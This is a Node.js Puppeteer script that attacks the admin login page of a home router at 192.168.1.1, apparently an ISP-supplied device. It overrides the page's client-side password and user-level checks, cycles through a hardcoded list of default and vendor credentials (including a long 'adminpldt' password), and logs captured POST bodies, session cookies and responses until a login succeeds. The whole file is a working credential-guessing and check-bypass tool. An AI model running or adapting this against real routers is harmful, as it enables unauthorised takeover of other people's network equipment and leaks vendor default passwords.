const puppeteer = require('puppeteer');

(async () => {
  const b = await puppeteer.launch({headless:false, ignoreHTTPSErrors:true, args:['--no-sandbox','--ignore-certificate-errors','--window-size=1280,900']});
  const [p] = await b.pages();

  // Intercept ALL requests to capture login
  p.on('request', req => {
    if (req.method() === 'POST') {
      console.log('\n>>> POST', req.url());
      console.log('    POST data:', req.postData()?.substring(0, 200));
    }
  });
  p.on('response', async res => {
    if (res.url().includes('login.cgi') || res.url().includes('CheckPwd')) {
      const headers = res.headers();
      console.log('<<< RESP', res.status(), res.url());
      console.log('    Set-Cookie:', headers['set-cookie']);
      const text = await res.text().catch(() => '');
      console.log('    Body:', text.substring(0, 300));
    }
  });

  // Load admin page
  await p.goto('https://192.168.1.1/admin.html', {waitUntil:'domcontentloaded', timeout:15000});
  await new Promise(r => setTimeout(r,2000));

  // Override disabling functions
  await p.evaluate(() => {
    window.setDisable = () => {};
    window.CheckPassword = () => 0;
    window.Userlevel = 0;
    window.preflag = 0;
  });

  // Try different credentials
  const creds = [
    ['adminpldt', 'AC2DIU7QW3ERTY6UPAS4DFG'],
    ['adminpldt', 'adminpldt'],
    ['admin', 'admin'],
    ['root', 'adminHW'],
    ['admin', 'adminHW'],
    ['adminpldt', 'pldtadmin'],
  ];

  for (const [user, pass] of creds) {
    console.log(`\n=== Trying ${user}:${pass} ===`);
    // Clear and retype
    await p.evaluate(() => {
      document.querySelector('input#txt_Username').value = '';
      document.querySelector('input#txt_Password').value = '';
    });
    await p.type('input#txt_Username', user, {delay:15});
    await p.type('input#txt_Password', pass, {delay:10});
    await p.click('button#button');
    await new Promise(r => setTimeout(r,3000));
    const url = p.url();
    console.log('URL after:', url);
    if (url.includes('index.asp') || url.includes('admin.asp') || url.includes('frame.asp')) {
      console.log('*** LOGIN SUCCESSFUL ***');
      break;
    }
  }

  console.log('\nFinal URL:', p.url());
  await new Promise(() => {});
})().catch(e => { console.error(e); process.exit(1); });
